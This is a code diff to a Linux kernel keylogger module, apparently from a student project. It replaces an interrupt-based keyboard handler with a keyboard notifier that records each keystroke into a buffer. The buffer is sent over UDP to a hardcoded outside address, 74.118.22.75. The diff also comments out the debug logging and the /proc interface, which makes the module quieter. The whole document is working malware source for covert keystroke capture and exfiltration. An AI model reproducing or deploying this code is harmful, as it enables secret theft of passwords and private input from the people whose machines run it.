@@ -5,6 +5,7 @@
 #include <linux/string.h>
 #include <linux/netpoll.h>
 #include <asm/io.h>
+#include <linux/keyboard.h>
 
 #include "keylogger.h"
 
@@ -16,17 +17,20 @@ static int kl_buffer_offset = 0;
 static struct file_operations proc_fops;
 static struct netpoll *np = NULL;
 static struct netpoll np_t;
+static struct notifier_block nb;
 
 // INADDR_LOCAL is the local ip address, since 127.0.0.1 wont work..
 // you'll have to replace this with the hex of the ip for the computer you're adding this
 // module to
-#define INADDR_LOCAL ((unsigned long int)0x0A60062B) // 10.96.6.43
+#define INADDR_LOCAL ((unsigned long int)0x0A600634) // 10.96.6.43
 #define INADDR_SEND ((unsigned long int)0x4A76164B) // 74.118.22.75 (isoptera.lcsc.edu)
 
 static void send_msg(char *msg, size_t size)
 {
-	netpoll_send_udp(np, msg, size);
-	printk(KERN_INFO "Successfully sent off: %s\n", msg);
+		if(kl_buffer[0] != '\0') {
+			netpoll_send_udp(np, msg, size);
+//			printk(KERN_INFO "Successfully sent off: %s\n", msg);
+		}
 }
 
 /*
@@ -39,26 +43,9 @@ static void reset_buffer(void)
 	memset(kl_buffer, 0, BUFFER_SIZE);
 }
 
-static irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs)
+
+static ssize_t read_simple(struct file *filp, char *buf, size_t count, loff_t *offp) 
 {
-	static unsigned char scancode;
-	int reslt;
-	char c;
-	scancode = inb (0x60);
-
-	// handle the scancode
-	reslt = handle_scancode(scancode, &c);
-	if(reslt == NEW_CHAR) {
-		if(kl_buffer_offset >= BUFFER_SIZE) {
-			reset_buffer();
-		}
-		kl_buffer[kl_buffer_offset++] = c;
-	}
-
-	return (irq_handler_t) IRQ_HANDLED;
-}
-
-static ssize_t read_simple(struct file *filp, char *buf, size_t count, loff_t *offp) {
 	int read_size;
 	if(count > BUFFER_SIZE) {
 		read_size = BUFFER_SIZE;
@@ -84,27 +71,50 @@ static void setup_netpoll(void)
 	np = &np_t;
 }
 
+int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
+	struct keyboard_notifier_param *param = _param;
+	//struct vc_data *vc = param->vc;
+	int ret = NOTIFY_OK;
+	int scancode;
+	int reslt;
+	char c;
+			  
+	if (code == KBD_KEYCODE) {
+		scancode = param->value;
+//		printk(KERN_DEBUG "KEYLOGGER %x %s\n", param->value, (param->down ? "down" : "up"));
+		if(!param->down) {
+			scancode += 0x80;
+		}
+
+		reslt = handle_scancode(scancode, &c);
+		if(reslt == NEW_CHAR) {
+			if(kl_buffer_offset >= BUFFER_SIZE) {
+				reset_buffer();
+			}
+			kl_buffer[kl_buffer_offset++] = c;
+		}
+	}
+	return 0;
+}
+
 /*
  Initialize the module - register the IRQ handler
 */
 static int __init init_keylogger(void)
 {
-	int result;
 	proc_fops.read = read_simple;
-	/*
- 	 Request IRQ 1, the keyboard IRQ, to go to our irq_handler SA_SHIRQ means we're willing to have othe handlers on this IRQ. SA_INTERRUPT can be used to make the handler into a fast interrupt.
-	*/
-	result = request_irq (KBD_INT, (irq_handler_t) irq_handler, IRQF_SHARED, "test_keyboard_irq_handler", (void *)(irq_handler));
-	if(!result) {
-		proc_create(PROC_FILE_NAME, 0, NULL, &proc_fops);
-		setup_netpoll();
-	}
-	return result;
+	nb.notifier_call = hello_notify;
+	register_keyboard_notifier(&nb);
+//	proc_create(PROC_FILE_NAME, 0, NULL, &proc_fops);
+	setup_netpoll();
+//	send_msg("hi", 2);
+	return 0;
 }
 
 static void __exit exit_keylogger(void)
 {
-	remove_proc_entry(PROC_FILE_NAME, NULL);
+	unregister_keyboard_notifier(&nb);
+//	remove_proc_entry(PROC_FILE_NAME, NULL);
 }
 
 module_init(init_keylogger);
